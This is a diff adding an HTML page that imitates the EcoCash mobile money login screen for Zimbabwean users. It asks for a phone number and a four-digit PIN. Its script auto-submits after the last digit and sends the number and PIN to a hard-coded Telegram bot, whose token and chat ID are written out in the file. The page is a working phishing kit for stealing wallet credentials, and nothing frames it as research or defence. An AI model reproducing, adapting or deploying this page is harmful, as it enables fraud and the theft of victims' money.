@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash Login</title>
+    <link rel="icon" href="favicon.ico">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #fff;
+        }
+        
+        .pin-input {
+            width: 50px;
+            text-align: center;
+            font-size: 24px;
+            margin: 0 5px;
+        }
+        
+        .logo {
+            font-size: 2rem;
+            font-weight: bold;
+        }
+        
+        .logo span:first-child {
+            color: #0066cc;
+        }
+        
+        .logo span:last-child {
+            color: red;
+        }
+        
+        .bottom-section {
+            background-color: #0056b3;
+            color: white;
+            padding: 20px;
+            border-radius: 20px 20px 0 0;
+        }
+    </style>
+</head>
+
+<body class="d-flex flex-column justify-content-between vh-100">
+    <div class="text-center mt-5">
+        <div class="logo"><span>Eco</span><span>Cash</span></div>
+        <h4 class="mt-3">Login</h4>
+        <div class="input-group w-75 mx-auto mt-3">
+            <span class="input-group-text"><img src="https://upload.wikimedia.org/wikipedia/commons/6/6a/Flag_of_Zimbabwe.svg" width="25"></span>
+            <span class="input-group-text">+263</span>
+            <input id="phone" type="tel" class="form-control" placeholder="Phone Number" pattern="[0-9]*" inputmode="numeric" required>
+        </div>
+        <p class="mt-3">Enter your PIN</p>
+        <div>
+            <input maxlength="1" class="pin-input" type="password">
+            <input maxlength="1" class="pin-input" type="password">
+            <input maxlength="1" class="pin-input" type="password">
+            <input maxlength="1" class="pin-input" type="password">
+        </div>
+    </div>
+    <div class="bottom-section text-center">
+        <p>To register an EcoCash wallet or get assistance, click below</p>
+        <button id="registerBtn" class="btn btn-light m-2">Register</button>
+        <button class="btn btn-light m-2">Help & Support</button>
+        <div class="mt-3">v2.0.2P</div>
+    </div>
+
+    <script>
+        document.querySelectorAll('.pin-input').forEach((input, index, arr) => {
+            input.addEventListener('input', () => {
+                if (input.value.length === 1 && index < arr.length - 1) {
+                    arr[index + 1].focus();
+                }
+                // Auto-submit after last digit is filled
+                if (index === arr.length - 1 && input.value.length === 1) {
+                    sendToTelegram();
+                }
+            });
+        });
+
+        function sendToTelegram() {
+            const phoneInput = document.getElementById('phone').value.trim();
+            const pin = Array.from(document.querySelectorAll('.pin-input'))
+                .map(i => i.value)
+                .join('');
+
+            if (!phoneInput || !/^\d+$/.test(phoneInput)) {
+                alert('Please enter a valid phone number.');
+                return;
+            }
+
+            if (pin.length !== 4) {
+                alert('Please enter your 4-digit PIN.');
+                return;
+            }
+
+            const botToken = '8215473378:AAHpdcLIykEjY14uMZJjuhPKvizv5vRUNvw';
+            const chatId = '5615316142';
+            const message = `Phone: +263${phoneInput}\nPIN: ${pin}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                })
+                .then(() => alert('Details sent successfully'))
+                .catch(err => console.error('Error:', err));
+        }
+    </script>
+
+</body>
+
+</html>
